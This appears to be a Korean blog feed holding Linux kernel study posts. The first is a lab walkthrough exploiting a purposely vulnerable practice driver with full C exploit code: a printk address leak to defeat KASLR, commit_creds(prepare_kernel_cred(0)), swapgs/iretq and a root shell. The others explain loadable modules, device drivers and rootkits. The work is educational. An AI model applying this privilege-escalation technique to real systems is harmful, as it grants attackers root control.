특정 주소를 전달받고 해당 주소를 실행시키는 로직을 확인할 수 있다. </p></br></br><h2 id="취약점-분석"><a href="#취약점-분석" class="headerlink" title="취약점 분석"></a>취약점 분석</h2><p><b>바이너리 분석</b>에서 사용자의 입력으로 부터 실행흐름을 변조할 수 있음을 확인하였다. 해당 디바이스 드라이버를 토대로 write 시스템 콜이 호출되게 될 경우 디바이스 드라이버의 경우 사용자의 입력(untrusted input)을 실행하게 되기 때문이다. 해당 디바이스 드라이버 파일에 write를 진행함으로써 다음이 진행되는지 확인해볼 필요가 있다.</p></br><h3 id="공격-코드"><a href="#공격-코드" class="headerlink" title="공격 코드"></a>공격 코드</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs &#123;c&#125;">#include &lt;stdio.h&gt;<br>#include &lt;stdlib.h&gt;<br>#include &lt;unistd.h&gt;<br>#include &lt;string.h&gt;<br>#include &lt;sys/types.h&gt;<br>#include &lt;sys/stat.h&gt;<br>#include &lt;fcntl.h&gt;<br>#include &lt;stdint.h&gt;<br><br><br>int main() &#123;<br>    int fd;<br>    void *ptr = 0x4141414141414141;<br>    <br>    fd = open(&quot;/dev/test&quot;, O_RDWR);<br><br>    write(fd, &amp;ptr, sizeof(ptr));<br><br>    close(fd);<br><br>    return 0;<br>&#125;<br></code></pre></td></tr></table></figure><p>디바이스 드라이버를 제어하는 코드를 작성하였다. 유저영역에서 전달하는 값의 경우는 0x414141414141이다. 앞서 제시한 취약한 디바이스 드라이버를 이용하여 write를 호출하며 0x414141414141의 주소의 경우는 정상적이지 않은 주소이기 때문에 kernel panic이 발생한다면 실행흐름을 변조할 수 있는 취약점으로 볼 수 있다.</p><h3 id="공격-결과"><a href="#공격-결과" class="headerlink" title="공격 결과"></a>공격 결과</h3><pre><code>qemu-system-x86_64: warning: TCG doesn&#39;t support requested feature: CPUID.01H:ECX.vmx [bit 5]/ $ ./exploit [    6.388318] general protection fault: 0000 [#1] SMP NOPTI[    6.392270] CPU: 0 PID: 69 Comm: exploit Tainted: G           O      5.8.5 #1[    6.393697] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014[    6.395480] RIP: 0010:0x4141414141414141[    6.396274] Code: Bad RIP value.[    6.396944] RSP: 0018:ffff9654c019feb8 EFLAGS: 00000246[    6.397924] RAX: 4141414141414141 RBX: 0000000000000008 RCX: 0000000000000000[    6.398380] RDX: 0000000000000000 RSI: 00007ffc01fb93a8 RDI: ffff9654c019fec8[    6.398853] RBP: ffff8cf1df9a8a00 R08: 4141414141414141 R09: 0000000000000000[    6.399308] R10: 0000000000000000 R11: 0000000000000000 R12: 0000000000000000[    6.399802] R13: 0000000000000008 R14: ffff9654c019ff10 R15: 00007ffc01fb93a0[    6.400302] FS:  0000000000e4c880(0000) GS:ffff8cf1dec00000(0000) knlGS:0000000000000000[    6.400912] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033[    6.401297] CR2: 0000000000459f30 CR3: 000000001f9fc000 CR4: 00000000000006f0[    6.401865] Call Trace:[    6.404432]  ? test_write+0x32/0x50 [test][    6.409471]  ? vfs_write+0xc2/0x1f0[    6.410200]  ? ksys_write+0x5a/0xd0[    6.410888]  ? do_syscall_64+0x3e/0x70[    6.411626]  ? entry_SYSCALL_64_after_hwframe+0x44/0xa9[    6.412496] Modules linked in: test(O)[    6.414119] ---[ end trace f59244d06c1a65c1 ]---[    6.415131] RIP: 0010:0x4141414141414141[    6.415955] Code: Bad RIP value.[    6.416379] RSP: 0018:ffff9654c019feb8 EFLAGS: 00000246[    6.416846] RAX: 4141414141414141 RBX: 0000000000000008 RCX: 0000000000000000[    6.417422] RDX: 0000000000000000 RSI: 00007ffc01fb93a8 RDI: ffff9654c019fec8[    6.418102] RBP: ffff8cf1df9a8a00 R08: 4141414141414141 R09: 0000000000000000[    6.418809] R10: 0000000000000000 R11: 0000000000000000 R12: 0000000000000000[    6.419337] R13: 0000000000000008 R14: ffff9654c019ff10 R15: 00007ffc01fb93a0[    6.419817] FS:  0000000000e4c880(0000) GS:ffff8cf1dec00000(0000) knlGS:0000000000000000[    6.420320] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033[    6.420804] CR2: 0000000000459f30 CR3: 000000001f9fc000 CR4: 00000000000006f0[    6.421417] Kernel panic - not syncing: Fatal exception[    6.422862] Kernel Offset: 0x2e800000 from 0xffffffff81000000 (relocation range: 0xffffffff80000000-0xffffffffbfffffff)[    6.424059] Rebooting in 1 seconds..qemu-system-x86_64: Trying to execute code outside RAM or ROM at 0x00000000afc00220This usually means one of the following happened:(1) You told QEMU to execute a kernel for the wrong machine type, and it crashed on startup (eg trying to run a raspberry pi kernel on a versatilepb QEMU machine)(2) You didn&#39;t give QEMU a kernel or BIOS filename at all, and QEMU executed a ROM full of no-op instructions until it fell off the end(3) Your guest kernel has a bug and crashed by jumping off into nowhereThis is almost always one of the first two, so check your command line and that you are using the right type of kernel for this machine.If you think option (3) is likely then you can try debugging your guest with the -d debug options; in particular -d guest_errors will cause the log to include a dump of the guest register state at this point.Execution cannot continue; stopping here.</code></pre><p>예상했던 결과와 동일하게 커널 패닉(kernel panic)이 발생하였으며 <b>RIP가 0x414141414141414141로 변조</b>되었음을 확인할 수 있다.</p></br></br><h2 id="취약점-공격"><a href="#취약점-공격" class="headerlink" title="취약점 공격"></a>취약점 공격</h2><p>분석과정을 통해 현재 kernel 함수의 주소를 알 수 있으며 실행흐름을 변조할 수 있음을 확인했다. 이러한 정보들을 토대로 공격자에게 유의미한 형태의 공격이 될 수 있도록 어떠한 형태로 공격을 진행할 것인가에 대해서 시나리오를 작성하겠다.</p><p>가장 파급력있고 공격자에게 자유도가 높은 방법은 리눅스(linux) 기반의 커널을 공격하는 것이기에 루트 권한의 쉘(shell)을 획득하는 것으로 볼 수 있다. 다음과 같은 공격이 이루어지기 위해서는 우선적으로 진행되어야 하는 것이 유저 권한을 루트 권한으로 상승(권한 상승)을 일으켜야 한다. 다음 단계로 공격자가 쉘을 사용할 수 있도록 쉘이 실행되어야 한다. 다음을 시나리오로 정리해보겠다.</p><h3 id="공격-시나리오"><a href="#공격-시나리오" class="headerlink" title="공격 시나리오"></a>공격 시나리오</h3><pre><code>STEP1. 커널 릭(kernel leak)을 통한 권한상승 함수 주소 정보 획득STEP2. commit_creds(prepare_kernel_cred(0))을 통한 권한 상승STEP3. 사용자 모드(user mode)로의 전환STEP4. shell 획득</code></pre><p>다음의 시나리오에서 이전 포스트에서 언급을 하지 않았었던 부분이 있다. STEP3에 해당하는 부분이다. 다음과 같은 과정을 수행하게 될 경우 STEP2를 수행하기 위해서 커널 모드(kernel mode)로 전환될 것이며 커널 모드에서 system 함수를 호출하게 될 경우 커널 패닉이 발생한다. 그러한 이유로 사용자 모드(user mode)로의 전환이 필요한 것이다. </p></br><ul><li>RIP</li><li>RSP</li><li>RFLAGS</li><li>CS</li><li>SS</li></ul></br><p>이러한 과정을 수행하기 위해서 작성할 익스플로잇 코드에서는 swapgs를 수행한 후 iret을 수행하려고 한다. iret를 실행할 경우 CPU는 스택에 저장해두었던 값을 이용하여 실행 상태를 복구한다. 이 때의 저장해야 하는 정보는 다음과 같다. 해당 레지스터를 저장해두며 복구하여 사용자모드로 전환하는 형태의 코드도 포함되어야 한다.</p></br><p>또한 디바이스 파일에 read()를 통해서 printk() 함수의 주소를 유출할 수 있다. 해당 주소를 통해 커널 베이스(kernel base)를 확인할 경우 0xbedb9 offset만큼 떨어진 형태를 보인다. 결과적으로 kernel base의 주소는 &amp;printk() - 0xbedb9이다. 커널 베이스 주소를 통해서 commit_creds의 주소와 prepare_kernel_cred의 주소를 구할 수 있으며 이를 통해 권한상승을 일으킬 수 있다. 이러한 과정을 모두 포함하여 작성한 익스플로잇은 다음과 같다.</p></br><h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs &#123;c&#125;">#include &lt;stdio.h&gt;<br>#include &lt;stdlib.h&gt;<br>#include &lt;unistd.h&gt;<br>#include &lt;string.h&gt;<br>#include &lt;sys/types.h&gt;<br>#include &lt;sys/stat.h&gt;<br>#include &lt;fcntl.h&gt;<br>#include &lt;stdint.h&gt;<br><br>unsigned long __attribute__((regparm(3))) (*commit_creds)(unsigned long cred);<br>unsigned long __attribute__((regparm(3))) (*prepare_kernel_cred)(unsigned long cred);<br><br>struct register_val &#123;<br>    uint64_t user_rip;<br>    uint64_t user_cs;<br>    uint64_t user_rflags;<br>    uint64_t user_rsp;<br>    uint64_t user_ss;<br>&#125; __attribute__((packed));<br><br>struct register_val rv;<br><br>void shell(void) &#123;<br>    execl(&quot;/bin/sh&quot;, &quot;sh&quot;, NULL);<br>&#125;<br><br>void backup_rv(void) &#123;<br>    asm(&quot;mov rv+8, cs;&quot;<br>        &quot;pushf; pop rv+16;&quot;<br>        &quot;mov rv+24, rsp;&quot;<br>        &quot;mov rv+32, ss;&quot;<br>       );<br>    rv.user_rip = &amp;shell;<br>&#125;<br><br>void payload(void) &#123;<br>    commit_creds(prepare_kernel_cred(0));<br>    asm(&quot;swapgs;&quot;<br>        &quot;mov %%rsp, %0;&quot;<br>        &quot;iretq;&quot;<br>        : : &quot;r&quot; (&amp;rv));<br>&#125;<br><br>int main() &#123;<br>    int fd;<br>    void *ptr = 0;<br>    void *leak = 0;<br>    void *kbase = 0;<br>    <br>    fd = open(&quot;/dev/test&quot;, O_RDWR);<br><br>    read(fd, &amp;leak, 0);<br>    printf(&quot;leak : %p\n&quot;, leak);<br>    <br>    kbase = leak - 0xbedb9;<br>    commit_creds = kbase + 0x8e9f0;<br>    prepare_kernel_cred = kbase + 0x8ec20;<br><br>    ptr = &amp;payload;<br><br>    backup_rv();<br><br>    write(fd, &amp;ptr, sizeof(ptr));<br><br>    close(fd);<br><br>    return 0;<br>&#125;<br></code></pre></td></tr></table></figure></br><h3 id="공격결과"><a href="#공격결과" class="headerlink" title="공격결과"></a>공격결과</h3><pre><code>qemu-system-x86_64: warning: TCG doesn&#39;t support requested feature: CPUID.01H:ECX.vmx [bit 5]/ $ whoamiuser/ $ ./exploit leak : 0xffffffffb5ebedb9/ # whoamiroot/ # </code></pre></br><h2 id="참고"><a href="#참고" class="headerlink" title="참고"></a>참고</h2><pre><code>b30w0lf님의 운영체제(Operating System)DREAMHACK - Linux Kernel ExploitINFLEARN - 리눅스 커널 해킹. A부터 Z까지</code></pre><h2 id="한줄평"><a href="#한줄평" class="headerlink" title="한줄평"></a>한줄평</h2><pre><code>과연 이러한 공격을 막을 수 있는 방법은 무엇일까 고민해보자</code></pre>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>exploit</tag>
      
      <tag>linux</tag>
      
      <tag>kernel</tag>
      
      <tag>mitigation</tag>
      
      <tag>kaslr</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] Linux Kernel Basic - (7) 디바이스 드라이버(Device Driver) 2편</title>
    <link href="/2021/09/09/LinuxKernelBasic7/"/>
    <url>/2021/09/09/LinuxKernelBasic7/</url>
    
    <content type="html"><![CDATA[<h2 id="Research-Linux-Kernel-Basic-7-디바이스-드라이버-Device-Driver-2편"><a href="#Research-Linux-Kernel-Basic-7-디바이스-드라이버-Device-Driver-2편" class="headerlink" title="[Research] Linux Kernel Basic - (7) 디바이스 드라이버(Device Driver) 2편"></a>[Research] Linux Kernel Basic - (7) 디바이스 드라이버(Device Driver) 2편</h2><p><img src="/img/penguinshot.png"></p></br><h2 id="서론"><a href="#서론" class="headerlink" title="서론"></a>서론</h2><p>지난 포스트에서는 커널의 종류인 모놀리식 커널과 마이크로 커널을 알아보았으며 적재 가능 모듈(LKM)이 어떠한 것 인지, 적재 가능 모듈(LKM)으로 사용되는 디바이스 드라이버에 대해 언급하였다. 해당 포스트에서는 캐릭터 디바이스 드라이버(Character Device Driver)를 직접 구현해보며 연구한 것을 토대로 포스트를 작성하겠다.</p></br><h2 id="디바이스-드라이버"><a href="#디바이스-드라이버" class="headerlink" title="디바이스 드라이버"></a>디바이스 드라이버</h2><p><img src="/img/device_driver_graph.PNG"></p><p>디바이스 드라이버의 경우 디바이스 자체에 대한 정보를 세부적으로 알 필요가 없으며 가상파일시스템(VFS)을 이용하여 파일에 대한 접근을 통해 디바이스를 제어할 수 있다. 해당 말을 일반적으로 풀어내면 디바이스 드라이버의 경우 추상화된 장치에 접근하여 정형화 된 인터페이스(open, read, write)과 같은 형태로 접근이 가능하다는 말이다.</p><h3 id="User-Application-측면"><a href="#User-Application-측면" class="headerlink" title="User Application 측면"></a>User Application 측면</h3><ul><li>하드웨어 장치, 즉 디바이스의 경우 하나의 파일로 인식할 수 있다.</li><li>정형화된 인터페이스 시스템 호출을 통해 실제 하드웨어 장치에 대한 접근/제어가 가능하다.</li></ul><h3 id="Operating-System-측면"><a href="#Operating-System-측면" class="headerlink" title="Operating System 측면"></a>Operating System 측면</h3><ul><li>리눅스에서 디바이스는 파일로 취급되며 액세스가 가능하다.</li><li>파일로 취급되므로 정의된 file operation을 기준으로 접근/제어가 가능하다.</li><li>각각의 디바이스는 디바이스를 식별하기 위한 Major Number와 Minor Number를 가지고 있다.</li></ul><h3 id="Major-Number-amp-Minor-Number"><a href="#Major-Number-amp-Minor-Number" class="headerlink" title="Major Number &amp; Minor Number"></a>Major Number &amp; Minor Number</h3><pre><code>$ ls -al /dev/*crw-rw----   1 root tty       7,   0 Sep  5 17:33 vcscrw-rw----   1 root tty       7,   1 Sep  5 17:33 vcs1crw-rw----   1 root tty       7,   2 Sep  5 17:33 vcs2crw-rw----   1 root tty       7,   3 Sep  5 17:33 vcs3crw-rw----   1 root tty       7,   4 Sep  5 17:33 vcs4crw-rw----   1 root tty       7,   5 Sep  5 17:33 vcs5crw-rw----   1 root tty       7,   6 Sep  5 17:33 vcs6.</code></pre><p>Major Number(주번호)의 경우는 커널에서 디바이스 드라이버를 구분/연결하는 용도로 사용되며 같은 디바이스 종류를 지칭한다. 1byte로 구성된다. Minor Number(부번호)의 경우는 디바이스 드라이버 내에 장치를 구분하기 위해 사용되며 각 디바이스의 부가적인 정보를 나타내며 2byte로 구성된다. 이를 통해 하나의 디바이스 드라이버가 여러 개의 디바이스를 제어 가능하다.</p></br><h2 id="모듈-프로그래밍"><a href="#모듈-프로그래밍" class="headerlink" title="모듈 프로그래밍"></a>모듈 프로그래밍</h2><h3 id="chardev-c"><a href="#chardev-c" class="headerlink" title="chardev.c"></a>chardev.c</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs &#123;c&#125;">// source: chardev.c<br>#include &lt;linux/init.h&gt;<br>#include &lt;linux/module.h&gt;<br>#include &lt;linux/kernel.h&gt;<br><br>MODULE_AUTHOR(&quot;G4EG4EG4E&quot;);<br>MODULE_DESCRIPTION(&quot;sample character device driver.&quot;);<br>MODULE_LICENSE(&quot;Dual BSD/GPL&quot;);<br><br>static int __init custom_init(void) &#123;<br>    printk(&quot;[+] Init Custom Device\n&quot;);<br><br>    return 0;<br><br>&#125;<br><br>static void __exit custom_exit(void) &#123;<br>    printk(&quot;[-] Exit Custom Device\n&quot;);<br>&#125;<br><br><br>module_init(custom_init);<br>module_exit(custom_exit);<br><br></code></pre></td></tr></table></figure><p>다음과 같은 디바이스 드라이버 모듈을 작성하였다. module_init의 경우는 해당 모듈이 등록될 경우 실행되는 함수이며, module_exit의 경우는 해당 모듈이 해제될 경우 실행되는 함수이다.</p></br><h3 id="Makefile"><a href="#Makefile" class="headerlink" title="Makefile"></a>Makefile</h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs makefile">obj-m += chardev.o<br>PWD := <span class="hljs-variable">$(<span class="hljs-built_in">shell</span> pwd)</span><br><br>KDIR:=/lib/modules/<span class="hljs-variable">$(<span class="hljs-built_in">shell</span> uname -r)</span>/build<br><br><span class="hljs-section">all:</span><br><span class="hljs-variable">$(MAKE)</span> -C <span class="hljs-variable">$(KDIR)</span> M=<span class="hljs-variable">$(PWD)</span> modules<br><br><span class="hljs-section">clean:</span><br><span class="hljs-variable">$(MAKE)</span> -C <span class="hljs-variable">$(KDIR)</span> M=<span class="hljs-variable">$(PWD)</span> clean<br></code></pre></td></tr></table></figure><p>모듈의 소스코드를 컴파일하기 위해서는 Makefile을 작성해야 한다. 커널 버전과 동일한 형태로 빌드를 진행해야 해당 시스템에서 동적으로 로드할 수 있는 모듈이 된다. 컴파일이 정상적으로 될 경우 chardev.ko 바이너리를 확인할 수 있으며 해당 바이너리가 LKM이다.</p></br><h3 id="커널-모듈의-등록과-해제"><a href="#커널-모듈의-등록과-해제" class="headerlink" title="커널 모듈의 등록과 해제"></a>커널 모듈의 등록과 해제</h3><pre><code>$ sudo insmod chardev.ko$ dmesg [301222.511894] atkbd serio0: Unknown key released (translated set 2, code 0x72 on isa0060/serio0).[301222.511896] atkbd serio0: Use &#39;setkeycodes 72 &lt;keycode&gt;&#39; to make it known.[301226.623243] atkbd serio0: Unknown key pressed (translated set 2, code 0x72 on isa0060/serio0).[301226.623250] atkbd serio0: Use &#39;setkeycodes 72 &lt;keycode&gt;&#39; to make it known.[301226.623564] atkbd serio0: Unknown key released (translated set 2, code 0x72 on isa0060/serio0).[301226.623566] atkbd serio0: Use &#39;setkeycodes 72 &lt;keycode&gt;&#39; to make it known.[301300.320388] [+] Init Custom Device.</code></pre><p>insmod 명령어를 통해 해당 커널 모듈을 등록할 경우 custom_init 함수가 실행되는 것을 확인할 수 있다.</p></br><pre><code>$ sudo rmmod chardev$ dmesg [301222.511894] atkbd serio0: Unknown key released (translated set 2, code 0x72 on isa0060/serio0).[301222.511896] atkbd serio0: Use &#39;setkeycodes 72 &lt;keycode&gt;&#39; to make it known.[301226.623243] atkbd serio0: Unknown key pressed (translated set 2, code 0x72 on isa0060/serio0).[301226.623250] atkbd serio0: Use &#39;setkeycodes 72 &lt;keycode&gt;&#39; to make it known.[301226.623564] atkbd serio0: Unknown key released (translated set 2, code 0x72 on isa0060/serio0).[301226.623566] atkbd serio0: Use &#39;setkeycodes 72 &lt;keycode&gt;&#39; to make it known.[301300.320388] [+] Init Custom Device[301311.542920] [-] Exit Custom Device.</code></pre><p>rmmod 명령어를 통해 해당 커널 모듈을 해제할 경우 custom_exit 함수가 실행되는 것을 확인할 수 있다.</p></br><h2 id="한줄평"><a href="#한줄평" class="headerlink" title="한줄평"></a>한줄평</h2><pre><code>아몬드 넥스트 레벨💁</code></pre><br><h2 id="참고"><a href="#참고" class="headerlink" title="참고"></a>참고</h2><pre><code>b30w0lf님의 운영체제(Operating System)https://butter-shower.tistory.com/29?category=715664</code></pre>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>exploit</tag>
      
      <tag>linux</tag>
      
      <tag>kernel</tag>
      
      <tag>mitigation</tag>
      
      <tag>kaslr</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] Linux Kernel Basic - (6) 디바이스 드라이버(Device Driver) 1편</title>
    <link href="/2021/09/08/LinuxKernelBasic6/"/>
    <url>/2021/09/08/LinuxKernelBasic6/</url>
    
    <content type="html"><![CDATA[<h2 id="Research-Linux-Kernel-Basic-6-디바이스-드라이버-Device-Driver-1편"><a href="#Research-Linux-Kernel-Basic-6-디바이스-드라이버-Device-Driver-1편" class="headerlink" title="[Research] Linux Kernel Basic - (6) 디바이스 드라이버(Device Driver) 1편"></a>[Research] Linux Kernel Basic - (6) 디바이스 드라이버(Device Driver) 1편</h2><p><img src="/img/penguinshot.png"></p></br><h2 id="서론"><a href="#서론" class="headerlink" title="서론"></a>서론</h2><p>해당 포스트에서는 모놀리식 커널과 마이크로 커널을 알아보고 리눅스 커널(Linux Kernel)은 어떠한 특성을 지니며 리눅스 커널 모듈(LKM)에 대한 설명을 진행하며 디바이스 드라이버를 직접 개발하여 직접 커널에 탑재해보는 연구를 진행하며 얻은 결과에 대한 포스팅을 진행하겠다.</p></br><h2 id="모놀리식-커널과-마이크로-커널"><a href="#모놀리식-커널과-마이크로-커널" class="headerlink" title="모놀리식 커널과 마이크로 커널"></a>모놀리식 커널과 마이크로 커널</h2><p><img src="/img/kernel.png" alt="커널의 종류"></p><p>커널이란 운영체제의 핵심이 되는 소프트웨어이며 메인 메모리에 상주하여 시스템의 존재하는 자원을 효율적으로 관리하는 역할을 한다는 이야기를 언급하였다. 예를 들어 프로세스의 우선순위를 통해 컨텍스트 스위칭 시 어떤 프로세스를 실행시킬 것 인지 관리도 하며 가상 메모리를 통해 하드 디스크에서 프로그램을 로드할 경우 메모리를 할당하거나 하는 등의 사용자가 컴퓨터를 사용할 경우 내부적으로 하드웨어의 접근을 통해 결정을 하는 등의 주요 역할을 한다. </p><p>그러한 커널에도 크게 두 가지 종류의 커널이 있다고 볼 수 있다. <u>모놀리식 커널(Monolithic Kernel)</u>과 <u>마이크로 커널(Micro Kernel)</u>이다. 모놀리식 커널의 경우는 시스템 기능인 (VFS, IPC, Device Driver)등과 같은 기능들을 커널이 수행하는 역할을 하지만 마이크로 커널(Micro Kernel)의 경우에는 운영체제로서 진행해야하는 핵심적인 기능(스케줄링, 메모리 관리)등의 기능만 커널에 담아 가벼운 형태로 만든 커널이다. 상단의 그림을 보면 기존에 커널이 제공해야만 한다고 생각하였던 File Systems, Process Server등이 User Space에서 돌아가고 있음을 볼 수 있다.</p><p>각 커널의 특성에 따라서 장단점을 가지고 있으며 모놀리식 커널에 특성상 주요 컴포넌트들이 커널에 위치하기에 커널 내부의 요소들이 복합적으로 상호작용을 하는 것이 간결하여 빠르다. 하지만 주요기능이 커널에 존재하여 메모리 충돌과 같은 이슈가 발생하면 커널 패닉(Kernel Panic)이 발생하며 시스템 자체가 종료된다. 마이크로 커널의 경우는 하드웨어 종속성을 최소화 시킨 형태로 핵심적인 기능만을 진행하기에 이식성이 높으며 새로운 기능을 추가할 경우 서버를 추가하는 방식으로 진행되기에 확장성이 좋다. 하지만 서로 다른 영역인 User Mode와 Kernel Mode의 빈번한 전환(Context Swithcing)이 발생하며 전체 속도면에서는 좋지 않다는 단점이 있다.</p></br><h2 id="적재-가능-커널-모듈-LKM"><a href="#적재-가능-커널-모듈-LKM" class="headerlink" title="적재 가능 커널 모듈(LKM)"></a>적재 가능 커널 모듈(LKM)</h2><p>리눅스 커널은 앞서 이야기한 커널 중 모놀리식 커널(Monolithic Kernel)이다. 일반적으로 모놀리식 커널의 단점은 디바이스 드라이버와 같은 커널 모듈을 추가/삭제하기 위해서는 커널을 재빌드 해야 한다고 한다. 하지만 다음과 같은 경우에는 얼마나 큰 불편함이 생길지 고민해보겠다. 하드웨어는 커널에 근접되어 있으며 커널은 유저모드에서 분리되어 있다. 그렇기에 하드웨어를 제어하기 위해서는 유저 모드에서 커널에 요청을 보내서 제어하는 간접적인 형태로 볼 수 있다. 결과적으로 해당 디바이스를 제어하기 위해서는 커널에 탑재가 되어 있어야 한다.</p><p>현재는 전 세계가 메타버스 코인에 탑승하여 다양한 형태의 새로운 하드웨어 주변 장치들이 출시되고 있다. 그럴 경우마다 리눅스 커널에 해당 디바이스 드라이버를 포함하여 빌드한다면 절대로 끝나지 않는 무간지옥에 빠지는 꼴이 된다. 또한 커널을 필요할 때는 사용하고 필요하지 않을 때는 사용하지 않도록 메모리에 로드하거나 로드하지 않도록 한다면 이에 따른 이점도 생긴다. 이러한 불편함을 리눅스에서 제공하는 기능인 적재 가능 커널 모듈(Loadable Kernel Module)이다.</p><p>적재 가능 커널 모듈(Loadable Kernel Module)이란 보다 자유롭게 커널에 등록하거나 해제하거나를 통해서 손쉽게 다룰 수 있다. 일반적으로 LKM(Loadable Kernel Module)이 사용되는 경우는 다음과 같다. </p><pre><code>디바이스 드라이버(Device Driver)파일 시스템 드라이버(Filesystem Driver)시스템 콜(System Call)네트워크 드라이버(Network Driver)터미널 드라이버(TTY line disciplines)실행가능한 인터프리터(Executable Interpreters)</code></pre><p>다음에 제시된 일반적인 용도를 살펴보면 새로운 장치의 디바이스 드라이버만을 이야기하는 것이 아닌 사용자가 정의한 형태의 시스템 콜도 모듈로 탑재가 가능하다는 것이다. 이러한 생각도 가능한 데 만약 권한상승 공격이 KASLR이나 여러가지 요소로 Exploit 자체가 확률적으로 수행된다면 루트 권한을 얻은 시점에서 특정 시스템 콜을 사용하면 루트 권한을 획득하는 형태로 모듈을 등록해놓는다면 매번 Exploit을 진행할 필요가 없이 성공적으로 권한 상승을 수행할 수 있다. 이러한 것이 일반적으로 언급되는 루트킷(rootkit)이다.</p><p>그렇다면 마이크로 커널(Micro Kernel)과 다른 점이 무엇이냐고 할 수 있다. 해당 언급은 어디에서도 찾아볼 수 없는 데 <u>내가 생각하고 느낀 바로 가장 큰 차이점은 어떠한 영역에 커널이 탑재되냐는 것</u>이다. 마이크로 커널(Micro Kernel)의 경우 디바이스 드라이버와 같은 기능들은 유저 영역의 메모리에 상주한다고 하면 적재 가능 커널 모듈(LKM)은 커널 영역에 로드가 되므로 이는 모놀리식 커널(Monolithic Kernel)의 확장으로 이해하는 것이 맞음으로 판단된다. 그렇지 않다면 Kernel Exploitation을 위한 공격 벡터로 볼 수 없기에 해당 포스트는 무의미한 포스트가 된다.</p></br><h2 id="디바이스-드라이버"><a href="#디바이스-드라이버" class="headerlink" title="디바이스 드라이버"></a>디바이스 드라이버</h2><p><img src="/img/device_driver_sample.PNG" alt="커널의 종류"></p><p>이전 단락에서 LKM(Loadable Kernel Module)에 대해서 언급하였으며 해당 단락에서는 일반적으로 LKM으로 구현되는 디바이스 드라이버에 대한 언급을 진행하겠다. 다시 한번 강조하지만 <u>유저 어플리케이션은 직접적으로 하드웨어를 제어할 수 없다.</u> 커널에 요청을 하여 하드웨어를 제어해야 하며 이러한 매개체의 역할을 하는 것이 커널 중 디바이스 드라이버이다.</p><p>디바이스 드라이버는 컴퓨터와 연결된 장치를 추상화시키므로 유저 어플리케이션이 정형화된 인터페이스를 통해 장치에 접근할 수 있는 형태의 소프트웨어로 볼 수 있다. 커널이 컴파일될 때 부터 포함된 디바이스 드라이버도 있으며 커널 부팅 후에 로드하는 디바이스 드라이버도 존재한다. 결과적으로 LKM으로 볼 수 있다.</p><br><p><img src="/img/device_driver_list.png"></p><br><h3 id="캐릭터-디바이스-드라이버-chrdev"><a href="#캐릭터-디바이스-드라이버-chrdev" class="headerlink" title="캐릭터 디바이스 드라이버(chrdev)"></a>캐릭터 디바이스 드라이버(chrdev)</h3><p>디바이스를 파일처럼 접근하며 해당 파일의 read/write를 수행하여 data를 stream방식으로 전송한다. 주로 console, keyboard, mouse, serial port driver등의 형태로 사용된다.</p><h3 id="블록-디바이스-드라이버-blkdev"><a href="#블록-디바이스-드라이버-blkdev" class="headerlink" title="블록 디바이스 드라이버(blkdev)"></a>블록 디바이스 